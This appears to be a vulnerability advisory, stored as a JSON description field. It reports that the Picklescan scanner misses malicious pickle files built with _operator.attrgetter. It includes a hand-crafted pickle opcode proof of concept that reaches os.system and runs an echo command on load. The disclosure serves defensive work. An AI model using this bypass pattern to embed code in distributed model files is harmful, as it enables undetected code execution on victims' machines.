    "Description": "### Summary\nPicklescan uses _operator.attrgetter, which is a built-in python library function to execute remote pickle files.\n\n### Details\nThe attack payload executes in the following steps:\n\n- First, the attacker crafts the payload by calling the _operator.attrgetter function in the reduce method.\n- Then, when the victim, after checking whether the pickle file is safe by using the Picklescan library and finding that this library doesn't detect any dangerous functions, decides to call pickle.load() on this malicious pickle file, it leads to remote code execution.\n\n### PoC\n```\nimport pickle\nimport pickletools\nopcode3 = b'''cbuiltins\n__import__\n(Vos\ntRp0\n0c_operator\nattrgetter\n(Vsystem\ntR(g0\ntR(Vecho \"pwned by _operator.attrgetter\"\ntR.'''\npickletools.dis(opcode3)\npickle.loads(opcode3)\n```\nThis PoC can't be easily create by pickle.dumps, so it was manually built. \n\n### Impact\nAny organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.\nAttackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.\nAttackers can distribute infected pickle files across ML models, APIs, or saved Python objects.\n\n### Report by\nPinji Chen (cpj24@mails.tsinghua.edu.cn) from the NISL lab (https://netsec.ccert.edu.cn/about) at Tsinghua University, Guanheng Liu (coolwind326@gmail.com).",
